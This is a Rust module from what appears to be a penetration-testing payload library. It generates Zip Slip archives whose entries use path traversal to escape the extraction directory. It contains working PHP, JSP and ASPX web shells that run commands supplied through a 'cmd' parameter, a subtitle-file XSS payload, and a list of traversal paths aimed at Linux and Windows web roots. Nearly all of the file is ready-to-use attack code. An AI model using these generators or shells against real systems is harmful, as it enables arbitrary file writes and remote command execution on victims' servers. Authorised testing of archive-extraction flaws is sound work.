//! Zip Slip Payloads
//!
//! Payloads for archive path traversal (Zip Slip) vulnerabilities.
//! This module is only available with the `zip-payloads` feature.
//!
//! # Overview
//!
//! Zip Slip is a vulnerability where archive extraction fails to validate
//! file paths, allowing files to be written outside the intended directory.
//!
//! # Example
//!
//! ```ignore
//! use rectitude::payloads::zipslip::{ZipSlipPayload, create_malicious_zip};
//!
//! let payload = ZipSlipPayload::new("../../../tmp/evil.txt", b"malicious content");
//! let zip_bytes = create_malicious_zip(&[payload])?;
//! ```

use std::io::{Cursor, Write};
use zip::ZipWriter;
use zip::write::SimpleFileOptions;

/// A Zip Slip payload entry
#[derive(Debug, Clone)]
pub struct ZipSlipPayload {
    /// The path within the archive (with traversal sequences)
    pub target_path: String,
    /// The content to write
    pub content: Vec<u8>,
    /// Optional MIME type hint
    pub mime_type: Option<String>,
}

impl ZipSlipPayload {
    /// Create a new Zip Slip payload
    pub fn new(target_path: &str, content: &[u8]) -> Self {
        Self {
            target_path: target_path.to_string(),
            content: content.to_vec(),
            mime_type: None,
        }
    }

    /// Create a payload with MIME type
    pub fn with_mime(target_path: &str, content: &[u8], mime: &str) -> Self {
        Self {
            target_path: target_path.to_string(),
            content: content.to_vec(),
            mime_type: Some(mime.to_string()),
        }
    }

    /// Create a text file payload
    pub fn text(target_path: &str, content: &str) -> Self {
        Self::with_mime(target_path, content.as_bytes(), "text/plain")
    }

    /// Create a VTT XSS payload
    ///
    /// For exploiting subtitle file processing vulnerabilities.
    pub fn vtt_xss(target_path: &str) -> Self {
        let vtt_content =
            "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n</script><script>alert('xss')</script>";
        Self::with_mime(target_path, vtt_content.as_bytes(), "text/vtt")
    }

    /// Create a PHP webshell payload
    pub fn php_shell(target_path: &str) -> Self {
        let shell = "<?php system($_GET['cmd']); ?>";
        Self::with_mime(target_path, shell.as_bytes(), "application/x-php")
    }

    /// Create a JSP webshell payload
    pub fn jsp_shell(target_path: &str) -> Self {
        let shell = r#"<%@ page import="java.io.*" %><%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) out.println(line);
}
%>"#;
        Self::with_mime(target_path, shell.as_bytes(), "application/x-jsp")
    }
}

/// Create a malicious ZIP archive with path traversal entries
///
/// # Example
/// ```ignore
/// use rectitude::payloads::zipslip::{ZipSlipPayload, create_malicious_zip};
///
/// let payloads = vec![
///     ZipSlipPayload::new("../../../tmp/test.txt", b"test"),
/// ];
/// let zip_bytes = create_malicious_zip(&payloads)?;
/// ```
pub fn create_malicious_zip(payloads: &[ZipSlipPayload]) -> Result<Vec<u8>, ZipError> {
    let mut buffer = Cursor::new(Vec::new());

    {
        let mut zip = ZipWriter::new(&mut buffer);
        let options =
            SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

        for payload in payloads {
            zip.start_file(&payload.target_path, options)
                .map_err(|e| ZipError::WriteError(e.to_string()))?;
            zip.write_all(&payload.content)
                .map_err(|e| ZipError::WriteError(e.to_string()))?;
        }

        zip.finish()
            .map_err(|e| ZipError::WriteError(e.to_string()))?;
    }

    Ok(buffer.into_inner())
}

/// Generate VTT XSS Zip Slip payload
///
/// Creates a ZIP with a malicious VTT file that escapes to a web-accessible directory.
pub fn vtt_xss_zip(escape_path: &str, filename: &str) -> Result<Vec<u8>, ZipError> {
    let full_path = format!("{}/{}", escape_path.trim_end_matches('/'), filename);
    let payload = ZipSlipPayload::vtt_xss(&full_path);
    create_malicious_zip(&[payload])
}

/// Generate file write Zip Slip payload
///
/// Creates a ZIP that will write arbitrary content to a target path.
pub fn file_write_zip(target_path: &str, content: &[u8]) -> Result<Vec<u8>, ZipError> {
    let payload = ZipSlipPayload::new(target_path, content);
    create_malicious_zip(&[payload])
}

/// Generate webshell Zip Slip payload
///
/// Creates a ZIP with a webshell that escapes to a web-accessible directory.
pub fn webshell_zip(escape_path: &str, shell_type: ShellType) -> Result<Vec<u8>, ZipError> {
    let payload = match shell_type {
        ShellType::Php => {
            let path = format!("{}/shell.php", escape_path.trim_end_matches('/'));
            ZipSlipPayload::php_shell(&path)
        }
        ShellType::Jsp => {
            let path = format!("{}/shell.jsp", escape_path.trim_end_matches('/'));
            ZipSlipPayload::jsp_shell(&path)
        }
        ShellType::Aspx => {
            let path = format!("{}/shell.aspx", escape_path.trim_end_matches('/'));
            let shell =
                r#"<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>"#;
            ZipSlipPayload::with_mime(&path, shell.as_bytes(), "application/x-aspx")
        }
    };

    create_malicious_zip(&[payload])
}

/// Shell types for webshell payloads
#[derive(Debug, Clone, Copy)]
pub enum ShellType {
    Php,
    Jsp,
    Aspx,
}

/// Common Zip Slip escape paths
pub fn common_escape_paths() -> Vec<&'static str> {
    vec![
        // Linux web roots
        "../../../var/www/html",
        "../../../var/www",
        "../../../srv/www/htdocs",
        "../../../usr/share/nginx/html",
        "../../../home/www",
        // Application directories
        "../../../tmp",
        "../../../app/public",
        "../../../app/static",
        // Windows
        "..\\..\\..\\inetpub\\wwwroot",
        "..\\..\\..\\xampp\\htdocs",
        "..\\..\\..\\wamp\\www",
    ]
}

/// Zip error types
#[derive(Debug, Clone)]
pub enum ZipError {
    WriteError(String),
    InvalidPath(String),
}

impl std::fmt::Display for ZipError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::WriteError(e) => write!(f, "ZIP write error: {}", e),
            Self::InvalidPath(e) => write!(f, "Invalid path: {}", e),
        }
    }
}

impl std::error::Error for ZipError {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_zip_slip_payload_new() {
        let payload = ZipSlipPayload::new("../test.txt", b"content");
        assert_eq!(payload.target_path, "../test.txt");
        assert_eq!(payload.content, b"content");
    }

    #[test]
    fn test_vtt_xss_payload() {
        let payload = ZipSlipPayload::vtt_xss("../../../tmp/evil.vtt");
        assert!(String::from_utf8_lossy(&payload.content).contains("WEBVTT"));
        assert!(String::from_utf8_lossy(&payload.content).contains("script"));
    }

    #[test]
    fn test_php_shell_payload() {
        let payload = ZipSlipPayload::php_shell("../shell.php");
        assert!(String::from_utf8_lossy(&payload.content).contains("<?php"));
    }

    #[test]
    fn test_create_malicious_zip() {
        let payloads = vec![
            ZipSlipPayload::new("../test1.txt", b"content1"),
            ZipSlipPayload::new("../../test2.txt", b"content2"),
        ];

        let result = create_malicious_zip(&payloads);
        assert!(result.is_ok());

        let zip_bytes = result.unwrap();
        assert!(!zip_bytes.is_empty());
        // ZIP file magic bytes
        assert_eq!(&zip_bytes[0..2], b"PK");
    }

    #[test]
    fn test_vtt_xss_zip() {
        let result = vtt_xss_zip("../../../tmp", "evil.vtt");
        assert!(result.is_ok());
        assert!(!result.unwrap().is_empty());
    }

    #[test]
    fn test_common_escape_paths() {
        let paths = common_escape_paths();
        assert!(!paths.is_empty());
        // All paths should contain traversal sequences (either Unix ../ or Windows ..\)
        assert!(
            paths
                .iter()
                .all(|p| p.contains("../") || p.contains("..\\"))
        );
    }
}
